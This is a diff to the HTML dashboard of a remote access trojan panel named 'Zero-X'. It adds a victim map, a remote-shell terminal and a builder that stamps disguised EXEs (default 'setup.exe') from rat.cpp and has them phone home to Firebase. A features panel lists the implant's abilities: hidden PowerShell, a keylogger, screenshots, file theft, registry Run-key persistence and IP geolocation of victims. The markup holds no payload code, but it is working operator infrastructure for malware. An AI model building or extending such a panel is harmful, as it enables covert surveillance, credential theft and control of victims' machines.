@@ -6,6 +6,7 @@
   <title>Zero-X | Dashboard</title>
   <link rel="stylesheet" href="style.css" />
   <style>
+    /* ── Users table ── */
     .users-table{width:100%;border-collapse:collapse;font-family:'JetBrains Mono',monospace;font-size:13px;}
     .users-table th{text-align:left;padding:8px 12px;color:#7b8094;font-weight:500;border-bottom:1px solid #1e2130;font-size:11px;text-transform:uppercase;letter-spacing:.06em;}
     .users-table td{padding:10px 12px;border-bottom:1px solid #1a1e2e;color:#e7e9f3;vertical-align:middle;}
@@ -13,6 +14,53 @@
     .users-table tr:hover td{background:#131825;}
     .btn.danger{background:transparent;color:#ff4d6d;border:1px solid #ff4d6d33;}
     .btn.danger:hover{background:#ff4d6d18;}
+    .btn.sm{padding:6px 12px;font-size:12px;}
+    .btn.cyan{background:transparent;color:#4ce0d2;border:1px solid #4ce0d233;}
+    .btn.cyan:hover{background:#4ce0d218;border-color:#4ce0d2;}
+
+    /* ── Status badges ── */
+    .badge{display:inline-flex;align-items:center;gap:5px;padding:3px 9px;border-radius:999px;font-size:11px;font-family:'JetBrains Mono',monospace;font-weight:500;}
+    .badge::before{content:'';width:6px;height:6px;border-radius:50%;flex-shrink:0;}
+    .badge.online{background:rgba(77,255,136,0.12);color:#4dff88;}.badge.online::before{background:#4dff88;box-shadow:0 0 5px #4dff88;}
+    .badge.idle{background:rgba(255,184,77,0.12);color:#ffb84d;}.badge.idle::before{background:#ffb84d;}
+    .badge.offline{background:rgba(123,128,148,0.12);color:#7b8094;}.badge.offline::before{background:#7b8094;}
+
+    /* ── Terminal ── */
+    .term-wrap{display:flex;flex-direction:column;height:520px;background:#060810;border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;}
+    .term-bar{display:flex;align-items:center;gap:12px;padding:12px 16px;background:var(--panel);border-bottom:1px solid var(--border);flex-shrink:0;}
+    .term-bar label{font-size:12px;color:var(--muted);font-family:'JetBrains Mono',monospace;}
+    .term-select{background:var(--panel-2);border:1px solid var(--border);color:var(--text);padding:6px 10px;border-radius:7px;font-family:'JetBrains Mono',monospace;font-size:12px;flex:1;max-width:340px;}
+    .term-select:focus{outline:none;border-color:var(--violet);}
+    .term-output{flex:1;overflow-y:auto;padding:14px 16px;font-family:'JetBrains Mono',monospace;font-size:12.5px;line-height:1.65;color:#c9ccd8;scroll-behavior:smooth;}
+    .term-output .line-cmd{color:var(--violet);margin-top:8px;}
+    .term-output .line-cmd::before{content:'❯  ';}
+    .term-output .line-out{color:#c9ccd8;white-space:pre-wrap;word-break:break-all;}
+    .term-output .line-sys{color:var(--muted);font-style:italic;}
+    .term-output .line-err{color:var(--danger);}
+    .term-input-row{display:flex;gap:0;border-top:1px solid var(--border);flex-shrink:0;}
+    .term-prompt{padding:0 14px;display:flex;align-items:center;font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--violet);background:#060810;border-right:1px solid var(--border);user-select:none;}
+    .term-input{flex:1;background:#060810;border:none;color:var(--text);padding:13px 14px;font-family:'JetBrains Mono',monospace;font-size:13px;outline:none;}
+    .term-send{padding:0 18px;background:var(--violet);border:none;color:#0a0c14;font-weight:700;font-size:13px;cursor:pointer;font-family:'JetBrains Mono',monospace;letter-spacing:.04em;}
+    .term-send:hover{opacity:.88;}
+    .term-send:disabled{opacity:.4;cursor:not-allowed;}
+
+    /* ── Features grid ── */
+    .feat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:14px;}
+    .feat-card{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:18px 20px;transition:border-color .15s;}
+    .feat-card:hover{border-color:var(--violet);}
+    .feat-card .feat-icon{width:36px;height:36px;border-radius:9px;background:var(--violet-soft);display:flex;align-items:center;justify-content:center;margin-bottom:12px;}
+    .feat-card .feat-icon svg{width:18px;height:18px;color:var(--violet);}
+    .feat-card h4{font-family:'Space Grotesk',sans-serif;font-size:14px;font-weight:600;margin:0 0 5px;}
+    .feat-card p{font-size:12.5px;color:var(--muted);margin:0;line-height:1.5;}
+    .feat-card code{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--cyan);background:rgba(76,224,210,.1);padding:2px 5px;border-radius:4px;}
+
+    /* ── Builder ── */
+    .setup-step{display:flex;gap:14px;margin-bottom:18px;align-items:flex-start;}
+    .step-num{width:26px;height:26px;border-radius:50%;background:var(--violet-soft);border:1px solid var(--violet);color:var(--violet);font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px;}
+    .step-text{font-size:13px;color:var(--muted);line-height:1.6;}
+    .step-text strong{color:var(--text);}
+    .step-text a{color:var(--cyan);text-decoration:none;}
+    .step-text a:hover{text-decoration:underline;}
   </style>
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -29,25 +77,30 @@
       <div class="nav-item active" data-target="dashboard">
         <span data-icon="overview"></span><span>Dashboard</span>
       </div>
+      <div class="nav-item" data-target="users">
+        <span data-icon="users"></span><span>Users</span>
+      </div>
+      <div class="nav-item" data-target="terminal">
+        <span data-icon="terminal"></span><span>Terminal</span>
+      </div>
+
+      <div class="nav-group-label">Tools</div>
       <div class="nav-item" data-target="builder">
         <span data-icon="builder"></span><span>Builder</span>
       </div>
+      <div class="nav-item" data-target="features">
+        <span data-icon="features"></span><span>Features</span>
+      </div>
+      <div class="nav-item" data-target="logs">
+        <span data-icon="logs"></span><span>Logs</span>
+      </div>
+
+      <div class="nav-group-label">Account</div>
       <div class="nav-item" data-target="account">
         <span data-icon="profile"></span><span>Account</span>
       </div>
       <div class="nav-item" data-target="social">
         <span data-icon="automation"></span><span>Social</span>
-      </div>
-      <div class="nav-item" data-target="users">
-        <span data-icon="users"></span><span>Users</span>
-      </div>
-
-      <div class="nav-group-label">Manage</div>
-      <div class="nav-item" data-target="automation">
-        <span data-icon="automation"></span><span>Automation</span>
-      </div>
-      <div class="nav-item" data-target="logs">
-        <span data-icon="logs"></span><span>Logs</span>
       </div>
       <div class="nav-item" data-target="settings">
         <span data-icon="settings"></span><span>Settings</span>
@@ -73,12 +126,13 @@
       </div>
 
       <div class="content">
-        <!-- Dashboard -->
+
+        <!-- ── Dashboard ── -->
         <section class="tab-panel active" id="panel-dashboard">
           <div class="hello">
             <div class="eyebrow">Dashboard</div>
             <h1 id="hello-name">Welcome back</h1>
-            <p>Drag to pan, scroll (or use the buttons) to zoom.</p>
+            <p id="map-subtitle">Each pin is a machine that ran your EXE. Green = online now, yellow = idle, red = gone.</p>
           </div>
           <div class="panel map-panel">
             <div class="map-shell" id="map-shell">
@@ -91,51 +145,226 @@
               <div class="map-hint">drag to pan · scroll to zoom</div>
             </div>
           </div>
+          <div style="display:flex;gap:14px;flex-wrap:wrap;margin-top:4px;">
+            <div class="stat-card" style="flex:1;min-width:140px;">
+              <div class="label">Total Hits</div>
+              <div class="value violet" id="stat-total">—</div>
+            </div>
+            <div class="stat-card" style="flex:1;min-width:140px;">
+              <div class="label">Online Now</div>
+              <div class="value cyan" id="stat-online">—</div>
+            </div>
+            <div class="stat-card" style="flex:1;min-width:140px;">
+              <div class="label">Countries</div>
+              <div class="value" id="stat-countries">—</div>
+            </div>
+          </div>
         </section>
 
-        <!-- Builder -->
+        <!-- ── Users ── -->
+        <section class="tab-panel" id="panel-users">
+          <div class="hello">
+            <div class="eyebrow">Users</div>
+            <h1>Connected Users <span id="users-count" style="font-size:16px;color:#7b8094;font-weight:400;margin-left:8px;"></span></h1>
+            <p>Everyone who ran your EXE. Click Terminal to open a shell on their machine.</p>
+          </div>
+          <div class="panel">
+            <div class="input-row" style="margin-bottom:20px;">
+              <button class="btn primary" id="users-refresh-btn">Refresh</button>
+            </div>
+            <div id="users-table-wrap">
+              <p style="color:#7b8094;">Configure Firebase in the Builder tab first.</p>
+            </div>
+          </div>
+        </section>
+
+        <!-- ── Terminal ── -->
+        <section class="tab-panel" id="panel-terminal">
+          <div class="hello">
+            <div class="eyebrow">Terminal</div>
+            <h1>Remote Shell</h1>
+            <p>Select a connected client and run commands. Output streams back in real time.</p>
+          </div>
+          <div class="panel" style="padding:0;overflow:hidden;">
+            <div class="term-wrap">
+              <div class="term-bar">
+                <label>Target:</label>
+                <select class="term-select" id="term-client-select">
+                  <option value="">— select a client —</option>
+                </select>
+                <button class="btn sm" id="term-refresh-clients" title="Refresh client list">↻</button>
+                <button class="btn sm danger" id="term-clear-btn">Clear</button>
+              </div>
+              <div class="term-output" id="term-output">
+                <div class="line-sys">Zero-X terminal — select a target above to begin.</div>
+              </div>
+              <div class="term-input-row">
+                <div class="term-prompt">❯</div>
+                <input class="term-input" id="term-input" placeholder="type a command…" autocomplete="off" spellcheck="false" />
+                <button class="term-send" id="term-send-btn" disabled>SEND</button>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- ── Builder ── -->
         <section class="tab-panel" id="panel-builder">
           <div class="hello">
             <div class="eyebrow">Builder</div>
-            <h1>Build something</h1>
-            <p>When someone runs your exe, it silently grabs their IP and location, then sends it back to your dashboard map — showing a red pin for every person who ran it. Click any pin to see their IP, city, and country.</p>
+            <h1>Build & Deploy</h1>
+            <p>Set up your Firebase backend once, then stamp EXEs and distribute them. Each EXE phones home to your dashboard.</p>
           </div>
 
           <div class="panel">
-            <h3>GitHub Token</h3>
-            <p class="desc">Go to <strong>github.com/settings/tokens</strong> → Generate new token (classic) → check only <strong>public_repo</strong> → copy it. Paste it here — this lets the exe report hits back to your map.</p>
-            <div class="input-row">
-              <input type="password" class="text-input" id="gh-token" placeholder="github_pat_..." style="min-width:280px;" />
-              <button class="btn" id="gh-save-btn">Save</button>
+            <h3>Firebase Setup</h3>
+            <p class="desc">One-time setup. Your Firebase project is your backend — it's free and stores all client connections.</p>
+            <div class="setup-step">
+              <div class="step-num">1</div>
+              <div class="step-text">Go to <a href="https://console.firebase.google.com" target="_blank">console.firebase.google.com</a> → <strong>Add project</strong> (free Spark plan, no credit card).</div>
+            </div>
+            <div class="setup-step">
+              <div class="step-num">2</div>
+              <div class="step-text">Inside your project → <strong>Realtime Database</strong> → Create database → Start in <strong>test mode</strong> → your DB URL appears at the top (e.g. <code>https://zero-x-abc123-default-rtdb.firebaseio.com</code>).</div>
+            </div>
+            <div class="setup-step">
+              <div class="step-num">3</div>
+              <div class="step-text"><strong>Project Settings</strong> (gear icon) → <strong>Service accounts</strong> tab → scroll to <em>Database secrets</em> → <strong>Show</strong> → copy the secret string.</div>
+            </div>
+            <div class="setup-step">
+              <div class="step-num">4</div>
+              <div class="step-text">Paste both below and hit <strong>Save</strong>. That's it — your dashboard is now live.</div>
+            </div>
+            <div class="input-row" style="flex-direction:column;align-items:stretch;gap:10px;max-width:520px;">
+              <input type="text"     class="text-input" id="fb-url-input"    placeholder="https://your-project-default-rtdb.firebaseio.com" style="width:100%;" />
+              <input type="password" class="text-input" id="fb-secret-input" placeholder="Database secret (legacy token)" style="width:100%;" />
+              <div style="display:flex;gap:10px;">
+                <button class="btn primary" id="fb-save-btn">Save Firebase Config</button>
+                <button class="btn" id="fb-test-btn">Test Connection</button>
+              </div>
             </div>
           </div>
 
           <div class="panel">
-            <h3>Executable name</h3>
-            <p class="desc">What should the downloaded file be called?</p>
+            <h3>Status</h3>
+            <p class="desc">Everything needs to be green before the EXE will generate.</p>
+            <div id="builder-status-chip" style="font-family:'JetBrains Mono',monospace;font-size:12.5px;color:#7b8094;margin-bottom:4px;">
+              ● Checking…
+            </div>
+            <p class="desc" style="margin:10px 0 0;font-size:12px;">
+              The template is compiled automatically by GitHub Actions whenever you push <code>rat.cpp</code>.
+              After the first push it takes ~2 minutes to appear. You can also trigger it manually from the
+              <strong>Actions</strong> tab in your GitHub repo.
+            </p>
+          </div>
+
+          <div class="panel">
+            <h3>Generate EXE</h3>
+            <p class="desc">Names the file, patches your Firebase credentials in, and downloads it — all in one click.</p>
             <div class="input-row">
-              <input type="text" class="text-input" id="builder-name" placeholder="myapp.exe" value="myapp.exe" />
-              <button class="btn primary" id="builder-build-btn">Build</button>
-              <button class="btn" id="builder-download-btn" disabled>Download</button>
+              <input type="text" class="text-input" id="builder-name" placeholder="setup.exe" value="setup.exe" style="min-width:200px;" />
+              <button class="btn primary" id="builder-gen-btn">Generate &amp; Download EXE</button>
             </div>
           </div>
 
           <div class="panel">
             <h3>Build log</h3>
             <div class="build-log" id="build-log">
-              <div class="build-log-line muted">Waiting to build...</div>
+              <div class="build-log-line muted">Waiting…</div>
             </div>
           </div>
         </section>
 
-        <!-- Account -->
+        <!-- ── Features ── -->
+        <section class="tab-panel" id="panel-features">
+          <div class="hello">
+            <div class="eyebrow">Features</div>
+            <h1>Agent Capabilities</h1>
+            <p>Everything the deployed EXE can do. Commands are sent from the Terminal tab.</p>
+          </div>
+          <div class="feat-grid">
+
+            <div class="feat-card">
+              <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div>
+              <h4>Shell Execution</h4>
+              <p>Run any <code>cmd.exe</code> command. Output streams back to the terminal. 10-second timeout, 64 KB cap.</p>
+            </div>
+
+            <div class="feat-card">
+              <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg></div>
+              <h4>PowerShell</h4>
+              <p>Prefix any command with <code>ps:</code> to route it through <code>powershell.exe -NoP -NonI -W Hidden</code>.</p>
+            </div>
+
+            <div class="feat-card">
+              <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="3" width="20" height="14" rx="2"/><polyline points="8 21 12 17 16 21"/></svg></div>
+              <h4>Screenshot</h4>
+              <p>Type <code>screenshot</code> — captures the full desktop, base64-encodes it, returns a viewable image in the terminal.</p>
+            </div>
+
+            <div class="feat-card">
+              <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg></div>
+              <h4>File Browser</h4>
+              <p>Type <code>ls C:\Users\</code> to list any directory. Returns names, sizes, and modified dates.</p>
+            </div>
+
+            <div class="feat-card">
+              <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></div>
+              <h4>File Download</h4>
+              <p>Type <code>download C:\path\to\file.txt</code> — reads it, base64-encodes, sends back. Max 4 MB.</p>
+            </div>
+
+            <div class="feat-card">
+              <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 20h9"/><path d="M16.5 3.5l4 4L7 21H3v-4L16.5 3.5z"/></svg></div>
+              <h4>Keylogger</h4>
+              <p>Uses <code>SetWindowsHookEx</code> to buffer keystrokes. Type <code>keylog</code> to flush the buffer to the terminal.</p>
+            </div>
+
+            <div class="feat-card">
+              <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="3"/><path d="M12 1v4M12 19v4M4.22 4.22l2.83 2.83M16.95 16.95l2.83 2.83M1 12h4M19 12h4M4.22 19.78l2.83-2.83M16.95 7.05l2.83-2.83"/></svg></div>
+              <h4>System Info</h4>
+              <p>Type <code>sysinfo</code> — returns hostname, username, OS version, RAM, CPU, architecture, and running processes.</p>
+            </div>
+
+            <div class="feat-card">
+              <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
+              <h4>Persistence</h4>
+              <p>Auto-installs to <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> on first launch. Survives reboots.</p>
+            </div>
+
+            <div class="feat-card">
+              <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></div>
+              <h4>Kill Switch</h4>
+              <p>Type <code>kill</code> to terminate the agent process on the target machine immediately.</p>
+            </div>
+
+            <div class="feat-card">
+              <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg></div>
+              <h4>IP Geolocation</h4>
+              <p>On checkin, grabs public IP via <code>api.ipify.org</code> and resolves city/country/lat-lon via <code>ip-api.com</code>. Drops a pin on your map.</p>
+            </div>
+
+            <div class="feat-card">
+              <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 7V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2"/></svg></div>
+              <h4>Process List</h4>
+              <p>Type <code>ps list</code> to get a full snapshot of running processes: PID, name, and memory usage.</p>
+            </div>
+
+            <div class="feat-card">
+              <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg></div>
+              <h4>Live Heartbeat</h4>
+              <p>Agent pings Firebase every 20 seconds with a timestamp. Dashboard shows real-time online/idle/offline status per client.</p>
+            </div>
+
+          </div>
+        </section>
+
+        <!-- ── Account ── -->
         <section class="tab-panel" id="panel-account">
           <div class="hello">
             <div class="eyebrow">Account</div>
-            <h1>Manage your account</h1>
-            <p>A few things you can actually do right now.</p>
+            <h1>Your Account</h1>
+            <p>Session info and display controls.</p>
           </div>
-
           <div class="panel account-card">
             <img id="account-avatar" src="" alt="Avatar" />
             <div>
@@ -147,7 +376,6 @@
               </div>
             </div>
           </div>
-
           <div class="panel">
             <h3>Display name override</h3>
             <p class="desc">Changes how your name shows across the panel. Local to this session only.</p>
@@ -156,24 +384,22 @@
               <button class="btn primary" id="nickname-apply">Apply</button>
             </div>
           </div>
-
           <div class="panel">
             <h3>Session</h3>
-            <p class="desc">Signs you out and sends you back to the login page.</p>
+            <p class="desc">Signs you out and returns you to the login page.</p>
             <div class="action-row">
               <button class="btn danger" id="account-logout-btn">Log out</button>
             </div>
           </div>
         </section>
 
-        <!-- Social -->
+        <!-- ── Social ── -->
         <section class="tab-panel" id="panel-social">
           <div class="hello">
             <div class="eyebrow">Social</div>
             <h1>Find us elsewhere</h1>
             <p>Links to where people can reach the community.</p>
           </div>
-
           <div class="panel social-card">
             <div class="social-icon" data-icon="discord-mark"></div>
             <div>
@@ -184,59 +410,30 @@
           </div>
         </section>
 
-        <!-- Users -->
-        <section class="tab-panel" id="panel-users">
-          <div class="hello">
-            <div class="eyebrow">Users</div>
-            <h1>Connected Users <span id="users-count" style="font-size:16px;color:#7b8094;font-weight:400;margin-left:8px;"></span></h1>
-            <p>Everyone who has run your exe. Hit Remove to wipe them from both this list and the map.</p>
-          </div>
-          <div class="panel">
-            <div class="input-row" style="margin-bottom:20px;">
-              <button class="btn primary" id="users-refresh-btn">Refresh</button>
-            </div>
-            <div id="users-table-wrap">
-              <p style="color:#7b8094;">Save your GitHub token in the Builder tab first, then come back here.</p>
-            </div>
-          </div>
-        </section>
-
-        <!-- Automation -->
-        <section class="tab-panel" id="panel-automation">
-          <div class="hello">
-            <div class="eyebrow">Automation</div>
-            <h1>Automations</h1>
-            <p>Nothing set up yet.</p>
-          </div>
-          <div class="panel">
-            <h3>Create an automation</h3>
-            <p class="desc">Not wired up yet — placeholder for now.</p>
-            <div class="action-row">
-              <button class="btn primary" data-inert>New automation</button>
-            </div>
-          </div>
-        </section>
-
-        <!-- Logs -->
+        <!-- ── Logs ── -->
         <section class="tab-panel" id="panel-logs">
           <div class="hello">
             <div class="eyebrow">Logs</div>
-            <h1>Activity logs</h1>
-            <p>Nothing has been logged yet.</p>
+            <h1>Activity Logs</h1>
+            <p>Commands sent and received, with timestamps.</p>
           </div>
           <div class="panel">
-            <p class="desc">Once things are connected, events will show up here.</p>
+            <div class="input-row" style="margin-bottom:16px;">
+              <button class="btn" id="logs-clear-btn">Clear Logs</button>
+            </div>
+            <div id="log-output" style="font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--muted);line-height:1.8;min-height:80px;">
+              No activity logged yet.
+            </div>
           </div>
         </section>
 
-        <!-- Settings -->
+        <!-- ── Settings ── -->
         <section class="tab-panel" id="panel-settings">
           <div class="hello">
             <div class="eyebrow">Settings</div>
-            <h1>Panel settings</h1>
-            <p>These actually work — try them out.</p>
+            <h1>Panel Settings</h1>
+            <p>Cosmetic settings that actually work.</p>
           </div>
-
           <div class="panel">
             <h3>Accent color</h3>
             <p class="desc">Changes the highlight color used across the panel.</p>
@@ -248,7 +445,6 @@
               <div class="swatch" style="background:#4dff88" data-color="#4dff88" title="Green"></div>
             </div>
           </div>
-
           <div class="panel">
             <div class="field-row">
               <div>
@@ -266,13 +462,14 @@
             </div>
           </div>
         </section>
-      </div>
+
+      </div><!-- /content -->
     </main>
   </div>
 
   <div class="toast" id="toast"></div>
-  <div class="run-banner" id="run-banner"></div>
 
+  <script src="config.js"></script>
   <script src="dashboard.js"></script>
 </body>
 </html>
